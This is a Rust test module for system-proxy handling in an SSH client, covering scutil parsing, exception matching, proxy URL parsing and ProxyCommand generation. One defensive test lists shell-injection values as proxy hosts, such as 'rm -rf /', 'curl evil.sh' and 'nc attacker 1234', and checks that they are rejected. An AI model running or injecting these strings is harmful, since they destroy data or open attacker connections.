    /// 是「按系统代理的规则走」，内网段与 `.local` 不该被硬塞进代理。
    #[test]
    fn parse_scutil_reads_the_exceptions_list() {
        let output = r#"<dictionary> {
  ExceptionsList : <array> {
    0 : localhost
    1 : 127.0.0.1
    2 : *.local
    3 : 10.0.0.0/8
    4 : kimi-usage-dashboard.lsai.tech
  }
  SOCKSEnable : 1
  SOCKSPort : 7893
  SOCKSProxy : 127.0.0.1
}"#;
        let proxy = parse_scutil_proxy(output).expect("应解析出 SOCKS 代理");
        assert_eq!(
            proxy.exceptions,
            vec![
                "localhost",
                "127.0.0.1",
                "*.local",
                "10.0.0.0/8",
                "kimi-usage-dashboard.lsai.tech",
            ]
        );

        // 空数组（单行形态）不该被误读成列表项
        let empty = "<dictionary> {\n  ExceptionsList : <array> {\n  }\n  SOCKSEnable : 1\n  SOCKSPort : 1080\n  SOCKSProxy : 127.0.0.1\n}";
        let proxy = parse_scutil_proxy(empty).expect("应解析出代理");
        assert!(proxy.exceptions.is_empty(), "空例外列表应解析为空");
    }

    /// 例外匹配：域名后缀与精确主机名走直连；CIDR 有意不猜。
    #[test]
    fn exceptions_match_domains_but_never_guess_cidr() {
        let proxy = SystemProxy {
            kind: ProxyKind::Socks5,
            host: "127.0.0.1".into(),
            port: 1080,
            exceptions: vec![
                "localhost".into(),
                "*.local".into(),
                "example.com".into(),
                "10.0.0.0/8".into(),
            ],
        };

        assert!(proxy.bypasses("localhost"));
        assert!(proxy.bypasses("LOCALHOST"), "匹配应大小写不敏感");
        assert!(proxy.bypasses("printer.local"), "*.local 应匹配子域");
        assert!(proxy.bypasses("example.com"), "精确主机名应匹配");
        assert!(proxy.bypasses("a.example.com"), "域名后缀应匹配子域");

        // 不匹配
        assert!(!proxy.bypasses("notexample.com"), "后缀必须落在点边界上");
        assert!(!proxy.bypasses("example.com.evil.net"));
        assert!(!proxy.bypasses("overseas.example.org"));
        // CIDR 不做前缀猜测：宁可走代理，也不要猜错网段
        assert!(!proxy.bypasses("10.1.2.3"), "CIDR 例外不做字符串前缀匹配");

        // 通配全部
        let all_bypassed = SystemProxy {
            exceptions: vec!["*".into()],
            ..proxy
        };
        assert!(all_bypassed.bypasses("anything.example.org"));
    }

    /// 非 ASCII 主机名不得让例外匹配 panic。
    ///
    /// 回归用例：后缀比较曾用 `host[host.len() - pattern.len()..]` 做字节下标
    /// 切片，只有长度判断挡着。主机名是自由输入（中文主机名/昵称常见），而
    /// 默认的 macOS `ExceptionsList` 里就有 `*.local`（pattern = 5 字节），
    /// 于是 `我的服务器`（15 字节）会在下标 10 处切进 `务` 中间而 panic——
    /// 在 russh 路径上 panic 逃出 `block_on`，连接状态永远停在「连接中」。
    #[test]
    fn exceptions_never_panic_on_non_ascii_hosts() {
        let proxy = SystemProxy {
            kind: ProxyKind::Socks5,
            host: "127.0.0.1".into(),
            port: 1080,
            // `local` 是 `*.local` 剥掉通配前缀后的形态，长度 5
            exceptions: vec!["*.local".into(), "例.com".into()],
        };

        for host in [
            "我的服务器",
            "中文中文中",
            "例.com",
            "a.例.com",
            "日本語.local",
        ] {
            // 只要不 panic 即可；命中与否由边界规则决定。
            let _ = proxy.bypasses(host);
        }
        assert!(proxy.bypasses("例.com"), "非 ASCII 精确匹配仍须生效");
        assert!(proxy.bypasses("a.例.com"), "非 ASCII 后缀匹配仍须生效");
        assert!(
            !proxy.bypasses("我的服务器"),
            "非 ASCII 主机名不该被误判命中 local"
        );
    }

    #[test]
    fn parse_proxy_url_accepts_schemes_and_bare_host_port() {
        assert_eq!(
            parse_proxy_url("socks5://127.0.0.1:7890"),
            Some(SystemProxy {
                kind: ProxyKind::Socks5,
                host: "127.0.0.1".into(),
                port: 7890,
                exceptions: Vec::new()
            })
        );
        assert_eq!(
            parse_proxy_url("socks://proxy.lan"),
            Some(SystemProxy {
                kind: ProxyKind::Socks5,
                host: "proxy.lan".into(),
                port: 1080,
                exceptions: Vec::new()
            })
        );
        assert_eq!(
            parse_proxy_url("http://proxy.lan:3128/"),
            Some(SystemProxy {
                kind: ProxyKind::HttpConnect,
                host: "proxy.lan".into(),
                port: 3128,
                exceptions: Vec::new()
            })
        );
        assert_eq!(
            parse_proxy_url("proxy.lan:8080"),
            Some(SystemProxy {
                kind: ProxyKind::HttpConnect,
                host: "proxy.lan".into(),
                port: 8080,
                exceptions: Vec::new()
            })
        );
        assert_eq!(
            parse_proxy_url("[::1]:1080"),
            Some(SystemProxy {
                kind: ProxyKind::HttpConnect,
                host: "::1".into(),
                port: 1080,
                exceptions: Vec::new()
            })
        );
        // 未知 scheme 与残缺输入不猜
        assert_eq!(parse_proxy_url("ftp://proxy.lan:21"), None);
        assert_eq!(parse_proxy_url("http://:3128"), None);
        assert_eq!(parse_proxy_url(""), None);
        assert_eq!(parse_proxy_url("http://proxy.lan:not-a-port"), None);
    }

    #[test]
    fn openssh_proxy_command_expresses_both_protocols() {
        let socks = SystemProxy {
            kind: ProxyKind::Socks5,
            host: "127.0.0.1".into(),
            port: 7893,
            exceptions: Vec::new(),
        };
        assert_eq!(
            socks.openssh_proxy_command().as_deref(),
            Some("nc -X 5 -x 127.0.0.1:7893 %h %p")
        );
        let http = SystemProxy {
            kind: ProxyKind::HttpConnect,
            host: "127.0.0.1".into(),
            port: 7893,
            exceptions: Vec::new(),
        };
        assert_eq!(
            http.openssh_proxy_command().as_deref(),
            Some("nc -X connect -x 127.0.0.1:7893 %h %p")
        );
    }

    /// IPv6 字面量代理无法写进 `ProxyCommand`：macOS 的 `nc -x` 解析不了
    /// （`[::1]:1080` 与 `::1:1080` 都报 getaddrinfo 失败）。生成一条必然失败的
    /// 命令会把「代理用不了」伪装成「连接被拒」，因此必须返回 `None`。
    #[test]
    fn openssh_proxy_command_refuses_ipv6_proxy_addresses() {
        for host in ["[::1]", "::1", "fe80::1"] {
            let proxy = SystemProxy {
                kind: ProxyKind::Socks5,
                host: host.into(),
                port: 1080,
                exceptions: Vec::new(),
            };
            assert_eq!(
                proxy.openssh_proxy_command(),
                None,
                "IPv6 代理 {host} 不该生成 nc 无法执行的 ProxyCommand"
            );
        }
    }

    /// `ProxyCommand` 由 shell 解释：代理地址里的 shell 元字符必须让它整体作废，
    /// 而不是拼进命令行。
    #[test]
    fn openssh_proxy_command_refuses_shell_metacharacters() {
        for hostile in [
            "127.0.0.1; rm -rf /",
            "127.0.0.1 && curl evil.sh",
            "$(whoami)",
            "`id`",
            "127.0.0.1|nc attacker 1234",
            "proxy with space",
            "",
        ] {
            let proxy = SystemProxy {
                kind: ProxyKind::Socks5,
                host: hostile.to_string(),
                port: 1080,
                exceptions: Vec::new(),
            };
            assert_eq!(
                proxy.openssh_proxy_command(),
                None,
                "含元字符的代理地址必须拒绝生成 ProxyCommand: {hostile:?}"
            );
        }
    }

    /// `route_with`：未选代理一律直连；选了代理但本机没有可用代理时报告
    /// 「不可用」（而不是静默直连）；本机地址与命中例外的目标直连。
    ///
    /// 用纯函数形态断言：`route` 会读进程环境变量与系统设置，那既让用例依赖
    /// 运行环境，也让并行执行的用例互相干扰。
    #[test]
    fn route_distinguishes_direct_via_and_unavailable() {
        let socks = SystemProxy {
            kind: ProxyKind::Socks5,
            host: "127.0.0.1".into(),
            port: 7893,
            exceptions: Vec::new(),
        };

        let mut config = SshConnectionConfig::local();
        config.host = "overseas.example.com".to_string();

        // 未选代理：一律直连，哪怕本机配了代理
        assert_eq!(
            route_with(&config, Some(socks.clone())),
            ProxyRoute::Direct,
            "未选代理时不该走代理"
        );

        // 选了代理且检测到代理：经它连接
        config.use_system_proxy = true;
        assert_eq!(
            route_with(&config, Some(socks.clone())),
            ProxyRoute::Via(socks.clone()),
            "选了代理且检测到代理时应走代理"
        );

        // 选了代理但检测不到：明确报不可用，而不是静默直连
        assert_eq!(
            route_with(&config, None),
            ProxyRoute::Unavailable,
            "选了代理却拿不到代理时应报不可用，而不是静默直连"
        );

        // 本机地址：即使选了代理也直连（代理端通常拒绝转回本机）
        for local in ["127.0.0.1", "localhost", "::1", "printer.local"] {
            config.host = local.to_string();
            assert_eq!(
                route_with(&config, Some(socks.clone())),
                ProxyRoute::Direct,
                "{local} 是本机地址，应直连"
            );
        }

        // 命中系统代理自带的例外列表：直连
        config.host = "internal.corp.example".to_string();
        let with_exception = SystemProxy {
            exceptions: vec!["*.corp.example".into()],
            ..socks.clone()
        };
        assert_eq!(
            route_with(&config, Some(with_exception)),
            ProxyRoute::Direct,
            "命中例外列表的目标应直连"
        );
    }

    #[test]
    fn connect_authority_brackets_ipv6_literals() {
        assert_eq!(authority("example.com", 22), "example.com:22");
        assert_eq!(authority("::1", 22), "[::1]:22");
        assert_eq!(authority("[::1]", 22), "[::1]:22");
    }

    #[test]
    fn socks5_address_uses_binary_form_for_literals_and_name_form_for_domains() {
        let mut buf = Vec::new();
        append_socks5_address(&mut buf, "127.0.0.1").unwrap();
        assert_eq!(buf, vec![0x01, 127, 0, 0, 1]);

        buf.clear();
        append_socks5_address(&mut buf, "example.com").unwrap();
        assert_eq!(buf[0], 0x03);
        assert_eq!(buf[1], 11);
        assert_eq!(&buf[2..], b"example.com");

        buf.clear();
        append_socks5_address(&mut buf, "::1").unwrap();
        assert_eq!(buf[0], 0x04);
        assert_eq!(buf.len(), 17);
    }
}
